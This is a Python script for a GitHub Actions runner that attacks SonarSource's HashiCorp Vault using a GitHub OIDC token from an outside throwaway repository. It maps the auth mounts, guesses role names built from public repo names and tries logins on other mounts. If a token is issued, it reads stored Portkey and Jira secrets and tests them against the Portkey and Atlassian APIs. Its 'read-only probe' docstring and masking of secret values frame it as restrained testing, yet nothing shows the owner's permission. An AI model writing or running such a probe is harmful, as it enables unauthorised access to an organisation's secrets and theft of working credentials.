#!/usr/bin/env python3
"""Read-only probe #2: GitHub OIDC -> HashiCorp Vault (vault.sonar.build) auth-layer differential.

Runs ONLY on our own throwaway repo's GitHub-hosted runner (cballk/fabric-oidc-10548).
Strictly read-only on Vault:
  - GET  /v1/sys/health
  - GET  /v1/sys/internal/ui/mounts         (unauthenticated UI endpoint, X-Vault-Request: true)
  - GET  /v1/sys/internal/ui/namespaces     (unauthenticated UI endpoint)
  - POST /v1/auth/jwt-ghwf/login            (1x without role = default_role test)
  - POST /v1/auth/<other-mount>/login       (<=3 mounts, 1 minimal attempt each, no credentials)
  - POST /v1/auth/jwt-ghwf/login            (<=10x: 5 public SonarSource repo role names x 2)
  - only if a client_token is issued: sys/capabilities-self, auth/token/lookup-self,
    at most ONE exact KV read per path, then <=1 minimal read-only validation per credential.
No writes, no deletes, no role/KV enumeration, no brute force. Secrets never printed in
plaintext (first4/last4 mask only).
"""
import base64
import json
import os
import socket
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

VAULT = "https://vault.sonar.build"
AUD = VAULT
RESULT = {"probe": "vault-auth-diff-11978"}

# 5 public SonarSource repos that really call SonarSource/vault-action-wrapper@v3
# (taken from the already-landed i11129/public_workflows manifest; not enumerated here).
PUBLIC_REPOS = [
    "sonar-java",
    "sonarlint-vscode",
    "sonarqube-mcp-server",
    "sonar-scanner-cli",
    "docker-sonarqube",
]


def log(*a):
    print(*a, flush=True)


def mask(v):
    if v is None:
        return None
    v = str(v)
    if len(v) <= 8:
        return "****"
    return v[:4] + "****" + v[-4:] + f" (len={len(v)})"


def http(method, url, data=None, headers=None, timeout=25):
    h = {"User-Agent": "oidc-vault-probe/2.0"}
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        if isinstance(data, (dict, list)):
            body = json.dumps(data).encode()
            h.setdefault("Content-Type", "application/json")
        else:
            body = data if isinstance(data, bytes) else str(data).encode()
    req = urllib.request.Request(url, data=body, headers=h, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read(300000)
            return {"status": r.status, "ms": int((time.time() - t0) * 1000),
                    "headers": dict(r.headers), "body": raw}
    except urllib.error.HTTPError as e:
        raw = e.read(300000)
        return {"status": e.code, "ms": int((time.time() - t0) * 1000),
                "headers": dict(e.headers or {}), "body": raw}
    except Exception as e:
        return {"status": None, "ms": int((time.time() - t0) * 1000),
                "error": f"{type(e).__name__}: {str(e)[:300]}"}


def jbody(r, n=4000):
    try:
        return json.loads(r["body"].decode("utf-8", "replace")) if r.get("body") else None
    except Exception:
        return {"_raw": (r.get("body") or b"")[:n].decode("utf-8", "replace")}


def errs(j):
    """normalise a Vault error/response into a short comparable string"""
    if isinstance(j, dict):
        if "errors" in j and isinstance(j["errors"], list):
            return "; ".join(str(x) for x in j["errors"])[:600]
        if "error" in j:
            return str(j["error"])[:600]
        return json.dumps(j)[:600]
    return str(j)[:600]


def decode_jwt(t):
    seg = t.split(".")[1]
    seg += "=" * (-len(seg) % 4)
    return json.loads(base64.urlsafe_b64decode(seg))


def get_oidc():
    url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
    tok = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
    if not url or not tok:
        return None, "no id-token env (missing permissions: id-token: write?)"
    u = url + ("&" if "?" in url else "?") + "audience=" + urllib.parse.quote(AUD)
    r = http("GET", u, headers={"Authorization": "Bearer " + tok, "Accept": "application/json"})
    if r["status"] != 200:
        return None, {"status": r["status"], "error": r.get("error"), "body": jbody(r)}
    return json.loads(r["body"].decode())["value"], None


def login(role_or_none, jwt):
    payload = {"jwt": jwt}
    if role_or_none is not None:
        payload["role"] = role_or_none
    r = http("POST", VAULT + "/v1/auth/jwt-ghwf/login", data=payload, timeout=25)
    j = jbody(r)
    out = {"role": role_or_none, "status": r["status"], "ms": r["ms"], "error": r.get("error")}
    tok = None
    if isinstance(j, dict) and isinstance(j.get("auth"), dict):
        tok = j["auth"].get("client_token")
        out["state"] = "TOKEN_ISSUED"
        out["policies"] = j["auth"].get("policies")
        out["ttl"] = j["auth"].get("lease_duration")
        out["meta"] = j["auth"].get("metadata")
    else:
        e = errs(j)
        out["vault_error"] = e
        low = e.lower()
        if "could not be found" in low or "unknown role" in low or "role not found" in low:
            out["state"] = "ROLE_NOT_FOUND"
        elif "does not match" in low or "claim" in low or "audience" in low or "permission denied" in low:
            out["state"] = "CLAIMS_MISMATCH"
        else:
            out["state"] = "OTHER_ERROR"
        out["raw_resp"] = j if not isinstance(j, dict) or len(json.dumps(j)) < 1500 else str(j)[:1500]
    return out, tok


def main():
    # 0) runner egress fingerprint (cheap, for the record)
    egress = {}
    for name, u in (("ipify", "https://api.ipify.org?format=json"), ("ipinfo", "https://ipinfo.io/json")):
        r = http("GET", u, timeout=15)
        egress[name] = {"status": r["status"], "body": jbody(r, 400) if r["status"] == 200 else r.get("error")}
    RESULT["egress"] = egress

    try:
        infos = socket.getaddrinfo("vault.sonar.build", 443, proto=socket.IPPROTO_TCP)
        RESULT["dns_vault"] = sorted({i[4][0] for i in infos})
    except Exception as e:
        RESULT["dns_vault"] = [f"getaddrinfo error: {type(e).__name__}: {str(e)[:200]}"]

    # 1) health
    h = http("GET", VAULT + "/v1/sys/health", timeout=25)
    hj = jbody(h)
    RESULT["sys_health"] = {"status": h["status"], "ms": h["ms"], "error": h.get("error"),
                            "version": (hj or {}).get("version") if isinstance(hj, dict) else None,
                            "sealed": (hj or {}).get("sealed") if isinstance(hj, dict) else None,
                            "cluster_id": (hj or {}).get("cluster_id") if isinstance(hj, dict) else None}

    # 2) unauthenticated UI mounts + namespaces
    uh = {"X-Vault-Request": "true"}
    m = http("GET", VAULT + "/v1/sys/internal/ui/mounts", headers=uh, timeout=20)
    mj = jbody(m)
    RESULT["ui_mounts"] = {"status": m["status"], "ms": m["ms"], "error": m.get("error"),
                           "error_text": errs(mj) if m["status"] != 200 else None}
    auth_mounts = []
    if isinstance(mj, dict) and isinstance(mj.get("data"), dict):
        d = mj["data"]
        am = d.get("auth") or {}
        if isinstance(am, dict):
            for p, v in am.items():
                v = v if isinstance(v, dict) else {}
                auth_mounts.append({
                    "path": p,
                    "type": v.get("type"),
                    "description": v.get("description"),
                    "options": v.get("options"),
                    "config": v.get("config"),
                    "accessor": v.get("accessor"),
                })
        RESULT["auth_mounts"] = auth_mounts
        # also record mounts pointing at paths of interest
        RESULT["secret_top_level"] = sorted((d.get("secret") or {}).keys())[:20] if isinstance(d.get("secret"), dict) else None
    ns = http("GET", VAULT + "/v1/sys/internal/ui/namespaces", headers=uh, timeout=20)
    RESULT["ui_namespaces"] = {"status": ns["status"], "ms": ns["ms"], "error": ns.get("error"),
                               "body": jbody(ns) if ns["status"] else errs(jbody(ns))}

    # 3) OIDC token (aud=https://vault.sonar.build)
    jwt, jerr = get_oidc()
    claims = {}
    if jwt:
        try:
            c = decode_jwt(jwt)
            claims = {k: c.get(k) for k in ("iss", "aud", "sub", "repository", "repository_owner",
                                            "repository_id", "ref", "ref_type", "environment",
                                            "job_workflow_ref", "event_name", "actor")}
        except Exception as e:
            jerr = f"decode error {e}"
    RESULT["oidc"] = {"ok": bool(jwt), "error": jerr, "claims": claims, "audience_requested": AUD}
    if not jwt:
        log("no OIDC token, aborting login matrix")
        emit()
        return

    token = None
    states = []

    # 4) jwt-ghwf WITHOUT role == mount default_role test (exactly 1)
    o, tok = login(None, jwt)
    RESULT["login_no_role_default"] = o
    states.append(("jwt-ghwf", o.get("state")))
    token = tok or token

    # 5) other auth mounts: <=3, one minimal attempt each, no credentials injected
    others = [a for a in auth_mounts if a["path"].rstrip("/") != "jwt-ghwf"]
    # prioritise jwt/oidc (most relevant to OIDC bypass), then approle/userpass
    prio = {"jwt": 0, "oidc": 0, "approle": 1, "userpass": 1, "ldap": 2, "kubernetes": 2, "cert": 2,
            "github": 2, "aws": 3, "azure": 3, "gcp": 3, "token": 9}
    others.sort(key=lambda a: prio.get((a.get("type") or "").lower(), 5))
    RESULT["login_other_mounts"] = []
    for a in others[:3]:
        p = a["path"].rstrip("/")
        t = (a.get("type") or "").lower()
        url = f"{VAULT}/v1/auth/{p}/login"
        data = None
        if t in ("jwt", "oidc"):
            data = {"jwt": jwt}  # default_role test on that mount
        elif t in ("approle", "cert", "token", "aws", "azure", "gcp"):
            data = {}
        elif t in ("userpass", "ldap"):
            url = f"{VAULT}/v1/auth/{p}/login/probe-nonexistent-{int(time.time())}"
            data = {"password": ""}
        elif t == "kubernetes":
            data = {"jwt": jwt}
        elif t == "github":
            data = {"token": ""}
        else:
            data = {}
        r = http("POST", url, data=data, headers=uh, timeout=25)
        j = jbody(r)
        item = {"mount": p, "type": t, "status": r["status"], "ms": r["ms"],
                "error": r.get("error"), "vault_error": errs(j)}
        if isinstance(j, dict) and isinstance(j.get("auth"), dict) and j["auth"].get("client_token"):
            item["state"] = "TOKEN_ISSUED"
            token = token or j["auth"].get("client_token")
            item["policies"] = j["auth"].get("policies")
        else:
            low = item["vault_error"].lower()
            item["state"] = ("NO_DEFAULT_ROLE" if ("default role" in low or "missing role" in low or "role is required" in low)
                             else ("MOUNT_ERROR" if ("role" in low or "invalid" in low or "permission" in low) else "OTHER"))
        RESULT["login_other_mounts"].append(item)

    # 6) role name x bound_claims differential (<=10 logins)
    RESULT["role_claims_matrix"] = []
    if not token:
        for repo in PUBLIC_REPOS:
            for suffix in ("", "-protected"):
                if token:
                    break
                role = f"github-sonarsource-{repo}{suffix}"
                o, tok = login(role, jwt)
                RESULT["role_claims_matrix"].append(o)
                token = tok or token

    # 7) only if a client_token was issued
    if token:
        H = {"X-Vault-Token": token, "X-Vault-Request": "true"}
        paths = ["development/kv/data/code-security-diff-val-claude-code", "development/kv/data/jira"]
        cap = http("POST", VAULT + "/v1/sys/capabilities-self", data={"paths": paths}, headers=H, timeout=20)
        RESULT["capabilities_self"] = {"status": cap["status"], "json": jbody(cap)}
        lk = http("GET", VAULT + "/v1/auth/token/lookup-self", headers=H, timeout=20)
        lj = jbody(lk)
        if isinstance(lj, dict) and isinstance(lj.get("data"), dict):
            lj = {"data": {k: lj["data"].get(k) for k in ("display_name", "policies", "ttl",
                                                          "identity_policies", "meta")}}
        RESULT["lookup_self"] = {"status": lk["status"], "json": lj}

        caps = {}
        cd = RESULT["capabilities_self"].get("json") or {}
        blob = cd.get("data") if isinstance(cd, dict) else None
        if isinstance(blob, dict):
            for k, v in blob.items():
                caps[k] = v if isinstance(v, list) else None
        kv = {}
        for path, wanted in (("development/kv/data/code-security-diff-val-claude-code", "portkey-api-key"),
                             ("development/kv/data/jira", ("user", "token"))):
            allowed = None
            for k, v in caps.items():
                if path in k or k in path:
                    allowed = "read" in (v or [])
            if allowed is False:
                kv[path] = {"skipped": "capabilities-self says no read"}
                continue
            r = http("GET", f"{VAULT}/v1/{path}", headers=H, timeout=20)
            j = jbody(r)
            item = {"status": r["status"], "ms": r["ms"], "error": r.get("error")}
            if isinstance(j, dict) and isinstance(j.get("data"), dict):
                dd = j["data"].get("data") if isinstance(j["data"].get("data"), dict) else j["data"]
                md = j["data"].get("metadata") if isinstance(j["data"], dict) else None
                item["keys"] = sorted(dd.keys())[:20] if isinstance(dd, dict) else None
                item["masked"] = {k: (mask(v) if isinstance(v, str) else "<non-str>") for k, v in dd.items()} if isinstance(dd, dict) else None
                item["version"] = (md or {}).get("version") if isinstance(md, dict) else None
                if isinstance(dd, dict) and dd.get("portkey-api-key"):
                    RESULT["_portkey"] = dd["portkey-api-key"]
                if isinstance(dd, dict) and dd.get("token"):
                    RESULT["_jira"] = (dd.get("user"), dd.get("token"))
            else:
                item["resp"] = j
            kv[path] = item
        RESULT["kv_read"] = kv

        if RESULT.get("_portkey"):
            key = RESULT.pop("_portkey")
            v = http("GET", "https://api.portkey.ai/v1/models", headers={"x-portkey-api-key": key}, timeout=25)
            j = jbody(v)
            n = len(j["data"]) if isinstance(j, dict) and isinstance(j.get("data"), list) else None
            RESULT["portkey_validate"] = {"status": v["status"], "ms": v["ms"], "model_count": n,
                                          "error": None if v["status"] == 200 else errs(j)}
        if RESULT.get("_jira"):
            user, tok = RESULT.pop("_jira")
            basic = base64.b64encode(f"{user}:{tok}".encode()).decode()
            v = http("GET", "https://sonarsource.atlassian.net/rest/api/3/myself",
                     headers={"Authorization": "Basic " + basic}, timeout=25)
            j = jbody(v)
            RESULT["jira_validate"] = {"status": v["status"], "ms": v["ms"],
                                       "identity": ({"accountId_present": bool(j.get("accountId")),
                                                     "displayName_present": bool(j.get("displayName")),
                                                     "emailAddress_present": bool(j.get("emailAddress")),
                                                     "accountType": j.get("accountType")} if isinstance(j, dict) else None)}

    emit()


def emit():
    log("===RESULT_JSON_START===")
    log(json.dumps(RESULT, indent=1, default=str))
    log("===RESULT_JSON_END===")


if __name__ == "__main__":
    main()
